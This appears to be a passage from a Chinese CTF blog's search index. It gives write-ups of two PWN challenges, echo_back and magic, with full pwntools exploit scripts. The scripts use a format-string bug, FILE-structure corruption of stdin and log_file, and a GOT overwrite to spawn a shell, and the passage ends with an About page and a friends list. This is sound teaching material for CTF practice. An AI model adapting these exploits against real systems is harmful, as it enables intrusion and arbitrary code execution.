[+] round2: val:0xbc | y:66 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee2 [+] round3: val:0x40 | y:67 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee3 [+] round4: val:0x90 | y:68 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee4 [+] round5: val:0x7f | y:69 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee5 [+] round6: val:0x0 | y:70 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee6 [+] round7:","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:1:2","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"参考资料 [1] http://www.matrix67.com/blog/archives/253 [2] https://www.jianshu.com/p/ed929cf72312 [3] http://quadium.net/funge/spec98.html ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:1:3","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"echo-back ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:2:0","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"checksec 64位程序，保护全开，无法修改got表 ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:2:1","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"漏洞 在上图函数中有明显的格式化字符串漏洞，但允许输入的字符只有7个，连一个p64都装不下。 main函数可以一直循环，在上述两个函数中选择，目前来看name 并没有什么作用。 由于格式化字符串太短无法直接改写返回地址，考虑攻击scanf()绕过大小限制，再写返回地址，分为如下几步 ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:2:2","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"获取stdin地址 我们知道栈上可能有某些关键地址，同时由于程序开启了PIE保护，必须利用格式化字符串先泄露libc与elf的基地址才能进一步攻击。观察echo_back函数return前栈的内容，可以发现在rsp+8偏移处有elf_base相关地址，在rsp+13编译处有libc_base相关地址，现在需要通过调试把找到具体的位置，把它们泄露出来 根据调试，分别输入*%14$p* 与*%19$p* 可以得到。当然其实我们还需要泄露一个返回地址所在位置，以便最后为了改写。注意，因为我们能泄露的是地址的内容而不是地址，所以这里我们只能选择泄露rbp内容，[rbp]+8处存放main函数返回地址。可以输入*%12$p* 得到。从而得到stdin地址。 ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:2:3","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"攻击stdin结构 由scanf()源码可知，它通过stdin的FILE结构暂存输入流，然后输入到指定位置。下面是scanf()的核心实现函数_IO_new_file_underflow()源码： int _IO_new_file_underflow (_IO_FILE *fp) { _IO_ssize_t count; #if 0/* SysV does not make this test; take it out for compatibility */ if (fp-\u003e_flags \u0026 _IO_EOF_SEEN) return (EOF); #endif if (fp-\u003e_flags \u0026 _IO_NO_READS) { fp-\u003e_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; } /*!!!!!*/ if (fp-\u003e_IO_read_ptr \u003c fp-\u003e_IO_read_end) return *(unsigned char *) fp-\u003e_IO_read_ptr; if (fp-\u003e_IO_buf_base == NULL) { /* Maybe we already have a push back pointer. */ if (fp-\u003e_IO_save_base != NULL) { free (fp-\u003e_IO_save_base); fp-\u003e_flags \u0026= ~_IO_IN_BACKUP; } _IO_doallocbuf (fp); } /* Flush all line buffered files before reading. */ /* FIXME This can/should be moved to genops ?? */ if (fp-\u003e_flags \u0026 (_IO_LINE_BUF|_IO_UNBUFFERED)) { #if 0_IO_flush_all_linebuffered (); #else /* We used to flush all line-buffered stream. This really isn't required by any standard. My recollection is that traditional Unix systems did this for stdout. stderr better not be line buffered. So we do just that here explicitly. --drepper */ _IO_acquire_lock (_IO_stdout); if ((_IO_stdout-\u003e_flags \u0026 (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF)) == (_IO_LINKED | _IO_LINE_BUF)) _IO_OVERFLOW (_IO_stdout, EOF); _IO_release_lock (_IO_stdout); #endif } _IO_switch_to_get_mode (fp); /* This is very tricky. We have to adjust those pointers before we call _IO_SYSREAD () since we may longjump () out while waiting for input. Those pointers may be screwed up. H.J. */ fp-\u003e_IO_read_base = fp-\u003e_IO_read_ptr = fp-\u003e_IO_buf_base; fp-\u003e_IO_read_end = fp-\u003e_IO_buf_base; fp-\u003e_IO_write_base = fp-\u003e_IO_write_ptr = fp-\u003e_IO_write_end = fp-\u003e_IO_buf_base; /*!!!!!*/ count = _IO_SYSREAD (fp, fp-\u003e_IO_buf_base, fp-\u003e_IO_buf_end - fp-\u003e_IO_buf_base); if (count \u003c= 0) { if (count == 0) fp-\u003e_flags |= _IO_EOF_SEEN; else fp-\u003e_flags |= _IO_ERR_SEEN, count = 0; } /*!!!!!*/ fp-\u003e_IO_read_end += count; if (count == 0) { /* If a stream is read to EOF, the calling application may switch active handles. As a result, our offset cache would no longer be valid, so unset it. */ fp-\u003e_offset = _IO_pos_BAD; return EOF; } if (fp-\u003e_offset != _IO_pos_BAD) _IO_pos_adjust (fp-\u003e_offset, count); return *(unsigned char *) fp-\u003e_IO_read_ptr; } 注意其中/*!!!!!*/标识的三处是我们攻击FILE结构时需要注意的地方 当stdin-\u003e_IO_read_ptr大于等于stdin-\u003e_IO_read_end时，此函数会调用_IO_SYSREAD()在stdin-\u003e_IO_buf_base处读入stdin-\u003e_IO_buf_end - stdin-\u003e_IO_buf_base个字节，然后更新stdin-\u003e_IO_read_end的值 我们知道了stdin的地址后可以利用格式化字符串漏洞将stdin的FILE的IO_buf_base修改为main函数的返回值所在地址，即可以实现改写返回地址。但在这之前不要忘了我们只能输入7个格式化字符，我们能用这7个字符干什么呢？先调试看看吧 在echo_back返回之前，我们查看stdin的结构，可以看到echo_back结束后stdin-\u003e_IO_read_ptr是等于stdin-\u003e_IO_read_end的，在下次执行echo_back之前我们希望能修改stdin-\u003e_IO_buf_base的值。这里我们想到通过格式化字符串写stdin-\u003e_IO_buf_base，但由于字数限制又不能直接写成main函数的返回地址处。 观察FILE地址：0x7fb99cd198e0 \u003c_IO_2_1_stdin_\u003e ，我们想到将stdin-\u003e_IO_buf_base低字节写成\\x00 ，这样我们可以控制从0x7fb99cd19900 到0x7fb99cd19964 的所有地址，而FILE结构的很多部分也就在这个范围内，包括stdin-\u003e_IO_buf_base与stdin-\u003e_IO_buf_end！这样我们便可以为所欲为了。但是我们怎么利用格式化字符串能写stdin-\u003e_IO_buf_base呢？这时想起了函数name，它写入的参数就echo_back中a1。所以我们在a1中输入p64(stdin-\u003e_IO_buf_base)，并在echo_back中键入格式化字符串修改，调试得a1对应位置为%16$p ，故输入%16$hhn 即可修改。动手试试，下图为修改结果 所以我们下次输入能从0x7fb99cd19900 一直写到0x7fb99cd19964 ，也能再次通过覆盖而改变stdin-\u003e_IO_buf_base与stdin-\u003e_IO_buf_end，为避免错误保持前几项不变，为_IO_2_1_stdin_+131 。下面将stdin-\u003e_IO_buf_base与stdin-\u003e_IO_buf_end修改为我们想要写的main函数返回地址处 改写成功！接下来我们只要再次执行到echo_back 中的scanf() 输入p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr) 就好了 但我们还是高兴得太早了，仔细看上图stdin-\u003e_IO_read_ptr显然已经小于stdin-\u003e_IO_read_end了！！所以我们根本没办法写入数据。 最后一个拦路虎通过echo_back中的getchar() 解决，getchar()会将stdin-\u003e_IO_read_ptr加一，所以再调用echo_back 几次（几十次，最终即可顺利读取并getshell。 ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:2:4","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"exp ubuntu16.04测试成功:-) #! /usr/bin/env python #coding:utf8 from pwn import * local = 1 if local: p = process('./echo_back') else: p = remote(\"111.198.29.45\", 38784) debug = 1 if debug: context.log_level = 'debug' elf = ELF('./echo_back') libc = ELF('./libc.so.6') prdi = 0x0000000000000d93 main_P_addr = 0xc6c IO_stdin = libc.symbols['_IO_2_1_stdin_'] context.terminal = ['tmux', 'splitw', '-h'] gdb.attach(p) def echo_back(size, con): p.sendlineafter('choice\u003e\u003e ', '2') p.sendlineafter('length:', str(size)) p.send(con) def name(name): p.sendlineafter('choice\u003e\u003e ', '1') p.sendafter('name:', name) def pause(p, s = 'pause'): return raw_input(s) # 泄露libc基址 echo_back(7, '%19$p') p.recvuntil('0x') libc_s_m_addr = int(p.recvuntil('-').split('-')[0], 16) - 240 print hex(libc_s_m_addr) offset = libc_s_m_addr - libc.symbols['__libc_start_main'] system = libc.symbols['system'] + offset bin_sh = libc.search('/bin/sh').next() + offset IO_stdin_addr = IO_stdin + offset print hex(offset) # 泄露elf基址 echo_back(7, '%14$p') p.recvuntil('0x') elf_base = int(p.recvuntil('-', drop=True), 16) - 0xd30 prdi = prdi + elf_base # 泄露main返回地址 echo_back(7, '%12$p') p.recvuntil('0x') main_ebp = int(p.recvuntil('-', drop=True), 16) main_ret = main_ebp + 0x8 # 修改IO_buf_base，增大输入字符数 IO_buf_base = IO_stdin_addr + 0x8 * 7 print \"IO_buf_base:\"+hex(IO_buf_base) name(p64(IO_buf_base)) echo_back(7, '%16$hhn') # 输入payload，覆盖stdinFILE结构的关键参数 payload = p64(IO_stdin_addr + 131) * 3 + p64(main_ret) + p64(main_ret + 3 * 0x8) p.sendlineafter('choice\u003e\u003e ', '2') p.sendafter('length:', payload) p.sendline('') # 绕过_IO_new_file_underflow中检测 for i in range(0,len(payload) - 1): p.sendlineafter('choice\u003e\u003e ', '2') p.sendlineafter('length:', '0') # 实现指定位置写 pause(p) p.sendlineafter('choice\u003e\u003e ', '2') p.sendlineafter('length:', p64(prdi) + p64(bin_sh) + p64(system)) p.sendline('') # getshell p.sendlineafter('choice\u003e\u003e ', '3') p.interactive() ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:2:5","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"magic ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:3:0","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"checksec 64位程序，只开了NX与Canary，可以劫持got表 ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:3:1","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"漏洞 分析程序知wizard为一个结构体，先在ida中创建，便于后续分析 主要函数为wizard_spell ，存在负下标的漏洞，并且函数先后调用了fwrite 与fread 同时我们发现，全局变量log_file与wizards数组离得很近，所以我们可以通过负下标控制log_file 指向的FILE内容 本题主要考察fwrite与fread的源码，读函数如fread/scanf等 都会调用IO_underflow ，写函数是IO_overflow ，与FILE 相关的操作都在里面。分析源码后某大佬得出结论（不是我 在读操作中，我们只能修改写相关的指针，如_IO_write_base/_IO_write_ptr 等 而在写操作中，我们只能修改读相关指针，如_IO_read_base/_IO_read_ptr等 也就是说我们只能在fwrite中改写读的指针，在fread中改写写的指针。我们的思路是，修改_IO_read_ptr打印出libc基址，修改_IO_write_ptr 改写atoi_got 内容为system ，具体来说分为以下部分 ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:3:2","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"修改_IO_write_ptr 我们发现wizard-\u003epower与log_file-\u003e_IO_write_ptr在各自结构体中的偏移相同，也就是说如果我们输入负下标-2，每次调用完wizard_spell后log_file-\u003e_IO_write_ptr就会减少50，很自然想到让其减少到FILE结构体，这样就可以任意修改FILE了。动手调试一下 我们先初始化一个wizard[0] ，以初始化FILE 结构体，在wizard_spell 返回前断下。 简单计算一下，656=14*50-44 ，也就是至少调用14次wizard_spell ，然后在这14次中应该输入44个字符串，因为每次_IO_write_ptr 还会加上输入的字符串数。这里经过反复调试（因为FILE前后数据段有很多重要参数，我们每次都修改了某些参数，很容易使程序崩溃），最终得到了一个不会崩溃的输入序列 for i in range(11): spell(-2, '\\x00') spell(-2, '\\x00' * 11) spell(-2, '\\x00' * 11) spell(-2, '\\x00' * 11) 这时_IO_write_ptr位于FILE-1的位置，调试一下确实如此，可以输入数据覆盖FILE 结构了 ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:3:3","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"泄露libc与heap_base 紧接上文，我们可以将FILE的_IO_read_ptr的值修改为atoi_got，这样在下一次调用wizard_spell 时调用fwrite 会将_IO_read_ptr指向的值也就是atoi 的实际地址读入到log_file 中，然后通过fread 打印出来，泄露libc 。需要注意这里我们应该向wizard[0] 而不是wizard[-2]中输入payload，因为我们并不想让_IO_write_ptr 减少50。同时应该尽量保持其他FILE 数据不变。 # leak libc payload = '\\x00' payload += p64(0xfbad24a8) spell(0,payload) payload = p64(atoi_got) + p64(atoi_got + 0x100) spell(0,payload) atoi_addr = u64(p.recv(8)) print hex(atoi_addr) 于是我们泄露了libc ，此时的_IO_write_ptr指向了_IO_read_base ，也即FILE +24偏移处，所以我们重新利用wizard[-2] 来使_IO_write_ptr指回FILE 首地址，继续修改FILE 来泄露heap_base ，而log_file 为FILE指针，内容即为堆上的地址，用它来泄露heap_base 。 # leak heap spell(-2, '\\x00' * 0x10) spell(0, '\\x00' * 10 + p64(0xfbad24a8)) spell(0, p64(log_file) + p64(log_file + 0x50)) heap = u64(p.recvn(8)) - 0x10 print 'heap:',hex(heap) ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:3:4","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"修改atoi_got 表项 紧接上文，我们现在的_IO_write_ptr指向了_IO_read_base 。我们下一步是想写atoi_got 表项为system ，就像上面一样很自然的思路当然是修改_IO_write_ptr 使其指向atoi_got ，但这是不行的。 回想最开始的一句话，再重复一遍予以强调。 在读操作中，我们只能修改写相关的指针，如_IO_write_base/_IO_write_ptr 等 而在写操作中，我们只能修改读相关指针，如_IO_read_base/_IO_read_ptr等 具体原因可以在源码中看到，当我们调用写函数并试图修改写指针，写操作完成后_IO_write_ptr 会再一次被覆盖，变回了原来的正常情况地址；读函数也类似。在上面的利用过程可以看到我们是利用fwrite 修改_IO_read_ptr ，所以才能成功泄露。也就是说，如果我们想改写atoi_got 表项，我们应该利用fread 改写_IO_write_ptr 。 源码分析 这里我们解释一下为什么，笔者说说自己的看法，当然如果耐心看看源码可能会有新的理解，下列代码节选自_IO_new_file_xsputn ，也即fwrite 核心实现函数。 ... if ((f-\u003e_flags \u0026 _IO_LINE_BUF) \u0026\u0026 (f-\u003e_flags \u0026 _IO_CURRENTLY_PUTTING)) count = f-\u003e_IO_buf_end - f-\u003e_IO_write_ptr; else if (f-\u003e_IO_write_end \u003e f-\u003e_IO_write_ptr) count = f-\u003e_IO_write_end - f-\u003e_IO_write_ptr; ... ... // 利用memcpy实现写，其中s为data地址 #ifdef _LIBC f-\u003e_IO_write_ptr = __mempcpy(f-\u003e_IO_write_ptr, s, count); #else memcpy(f-\u003e_IO_write_ptr, s, count); f-\u003e_IO_write_ptr += count; 我们想想如果在fwrite 中想改变_IO_write_ptr为A会发生什么，在执行__memcpy 前_IO_write_ptr均为原值B，但是s的内容为A（我们试图改变_IO_write_ptr为A），在__memcpy的过程中_IO_write_ptr确实被改为A了，但不要忘了 还需要将它的返回值赋给_IO_write_ptr，所以_IO_write_ptr变回了B+count ，一如正常执行后的结果！至此我们明白了，为什么fwrite 改变_IO_write_ptr并不奏效。 回归正题 所以怎么利用fread 改写_IO_write_ptr，然后在下一次wizard_spell 中就能实现指定位置写呢？这里还是要从fread 源码入手，它的核心实现落到了_IO_file_xsgetn 上，部分源码如下 ... if (fp-\u003e_IO_read_ptr \u003c fp-\u003e_IO_read_end) return *(unsigned char *)fp-\u003e_IO_read_ptr; ... ... fp-\u003e_IO_read_base = fp-\u003e_IO_read_ptr = fp-\u003e_IO_buf_base; fp-\u003e_IO_read_end = fp-\u003e_IO_buf_base; fp-\u003e_IO_write_base = fp-\u003e_IO_write_ptr = fp-\u003e_IO_write_end = fp-\u003e_IO_buf_base; //调用系统接口读入 count = _IO_SYSREAD(fp, fp-\u003e_IO_buf_base, fp-\u003e_IO_buf_end - fp-\u003e_IO_buf_base); 这里我们首先得绕过第一个判断（不然不读了），然后发现它把很多FILE 指针的值都变为了_IO_buf_base ，包括 _IO_write_ptr。我们无法在fwrite 中顺利改变_IO_write_ptr，何不改变_IO_buf_base ，然后在调用fread 后就能改变_IO_write_ptr 了。尝试一下： spell(0, p64(log_file) + p64(heap + 0x200) * 3) spell(0, p64(atoi_got) + p64(atoi_got + 0xAAA)) 很遗憾，调试发现并没有改写成功。 我们想把_IO_buf_base 赋值为atoi_got ，然后让_IO_write_ptr 也变为这个值。再回头看看fwrite 源码不难发现，由于_IO_write_end 也被赋值为_IO_buf_base ，所以在fwrite 中count 为0，不会再读了！ if ((f-\u003e_flags \u0026 _IO_LINE_BUF) \u0026\u0026 (f-\u003e_flags \u0026 _IO_CURRENTLY_PUTTING)) { count = f-\u003e_IO_buf_end - f-\u003e_IO_write_ptr; ... } else if (f-\u003e_IO_write_end \u003e f-\u003e_IO_write_ptr) count = f-\u003e_IO_write_end - f-\u003e_IO_write_ptr; /* Space available. */ /* Then fill the buffer. */ if (count \u003e 0) { if (count \u003e to_do) count = to_do; #ifdef _LIBC f-\u003e_IO_write_ptr = __mempcpy(f-\u003e_IO_write_ptr, s, count); #else memcpy(f-\u003e_IO_write_ptr, s, count); f-\u003e_IO_write_ptr += count; 好了，所以我们最终如下操作，先把_IO_write_end 与_IO_write_ptr 都改为atoi_got + 143 ，最后再利用负下标漏洞把_IO_write_ptr 向下滑倒atoi_got -1，于是目的就达成了。 # change atoi to system spell(0, p64(log_file) + p64(heap + 0x200) * 3) spell(0, p64(atoi_got + 143) + p64(atoi_got + 0xAAA)) spell(-2, '\\x00') spell(-2, '\\x00' * 3) spell(-2, '\\x00' * 3) payload = '\\x00' + p64(system) spell(0, payload) ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:3:5","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"exp ubuntu16.04测试成功 #! /usr/bin/env python from pwn import * p = process('./magic') debug = 1 if debug: context.log_level = 'debug' elf = ELF('./magic') atoi_got = elf.got['atoi'] log_file = elf.sym['log_file'] libc = elf.libc def create(): p.sendlineafter('choice\u003e\u003e ', '1') p.sendlineafter(\"Give me the wizard's name:\", 'aaa') def spell(index, name): p.sendlineafter('choice\u003e\u003e ', '2') p.sendlineafter('Who will spell:', str(index)) p.sendafter('Spell name:', str(name)) def pause(p, s = 'pause'): return raw_input(s) context.terminal = ['tmux', 'splitw', '-h'] # gdb.attach(p) create() spell(0, 'aaa') #pause() # leak libc for i in range(11): spell(-2, '\\x00') spell(-2, '\\x00' * 11) spell(-2, '\\x00' * 11) spell(-2, '\\x00' * 11) payload = '\\x00' payload += p64(0xfbad24a8) spell(0,payload) payload = p64(atoi_got) + p64(atoi_got + 0x100) spell(0,payload) atoi_addr = u64(p.recv(8)) print hex(atoi_addr) # gdb.attach(p) offset= atoi_addr - libc.sym['atoi'] system = offset + libc.sym['system'] # leak heap spell(-2, '\\x00' * 0x10) spell(0, '\\x00' * 10 + p64(0xfbad24a8)) spell(0, p64(log_file) + p64(log_file + 0x50)) heap = u64(p.recvn(8)) - 0x10 print 'heap:',hex(heap) # change atoi to system spell(0, p64(log_file) + p64(heap + 0x200) * 3) spell(0, p64(atoi_got + 143) + p64(atoi_got + 0xAAA)) print \"atoi_got:\"+hex(atoi_got) spell(-2, '\\x00') spell(-2, '\\x00' * 3) spell(-2, '\\x00' * 3) payload = '\\x00' + p64(system) spell(0, payload) p.sendlineafter('choice\u003e\u003e ','$0') p.interactive() ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:3:6","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":null,"content":"Nobody, want to be somebody. ","date":"2019-08-02","objectID":"/about/:0:0","tags":null,"title":"About Me","uri":"/about/"},{"categories":null,"content":"These are my homies. Hope our stories will not end. 这里是有幸认识的部分同志与后浪，希望多年以后还能回想起我们之间发生的故事 ================================================================================ CTF同好，MISC@北航Lancet， 唯一一次相遇是在ciscn2021 final. 祝保研成功，开发顺利 \rMobilis In Mobili\rLancet@BUAA\r\r\r\r================================================================================ 武大ACM选手，是一位追求细致与全面的学习家 \rMaple\rWuhan University\r\r\r\r================================================================================ Lilac同届队长、Lilac干饭精神创始人、年入百万的洛谷讲师、知乎大V。手把手教我焊过PCB板、在为数不多出席的几次课上玩过雀魂、炒过股的赛博神必人。天上懂一半，地上全都懂了属于是。 \r阮行止\rWeb\u0026Crypto@Lilac\r\r\r\r================================================================================ 流水的Lilac，铁打的航神。企业名人、可靠的学长。祝博士学位攻读顺利！ \r王一航\rLilac 全能学长\r\r\r\r================================================================================ 直系学长，真的真的十分感谢带我入门PWN，带我走近Lilac，可以说是跟着葵佬从大一开始摸爬滚打过来的（我大一问的问题真的好弱智orz. 祝工作顺利，拿到心仪的岗位！ \rwxk\rPWN@Lilac\r\r\r\r================================================================================ 有素养有思想的学习家。校MineCraft建筑队成员，尝试抓我过去做苦力(我这么菜😂). 2021郑州洪水与我父母被困在同一辆火车上2333. 希望有时间能一起学习拍摄与剪辑，长期联系 \rtrueKeuin\rWEB@Lilac\r\r\r\r================================================================================ Lilac同届队员中唯一一位人生赢家。可靠的泉神。无私的资源分享者。祝打工快乐，WEB爷爷ddw. \r惊蛰\rWEB@Lilac\r\r\r\r================================================================================ 湖北老乡学长。秋豪爷爷带我挖洞带我科研呜呜，想学fuzzing一直没有时间😭 \r李秋豪\rTencent Blade Team\r\r\r\r================================================================================ 永远的宝哥。学分绩比我还高的神佬（好像很多人都比我高。香港大学直博巨佬。自然语言处理带师，发顶会文章易如反掌。祝海外科研顺利！ \r谢天宝\rNLP Lab@HKU\r\r\r\r================================================================================ 哈工大开源软件协会会长。祝开源事业常青！开源万岁！ \rBillChen China\rWEB@Lilac\r\r\r\r================================================================================ 高中芜湖机场OI选手。ACM CTF双线程选手。哈工大算法课程考试最高分之一。企业著名划水运动员。「这又何尝不是一种ntr呢」要素齐全。「三十五岁前赚够钱」的打工智者。苟富贵，勿相忘。岸桐，我的岸桐😭 希望有机会能教我算法，以及我觊觎你的steam账号很久了（ \rInitialize\rWEB@Lilac\r\r\r\r","date":"2019-08-02","objectID":"/friends/:0:0","tags":null,"title":"Memos","uri":"/friends/"}]